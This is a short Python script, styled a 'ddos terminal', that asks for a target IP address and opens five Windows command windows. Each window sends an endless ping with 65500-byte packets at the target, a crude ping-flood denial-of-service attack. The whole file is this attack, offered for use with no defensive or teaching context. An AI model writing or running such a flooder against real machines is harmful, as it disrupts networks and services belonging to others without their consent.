import os
import time
print('welcome to ddos terminal enter target ip address when prompted')
input('click enter to continue')

ip = input('enter the target local IP: ')
cmd = f"ping {ip} -t -l 65500"

for i in range(5):
    os.system(f'start cmd /k"color 0A && {cmd}"')
    time.sleep(0.2)
    
    
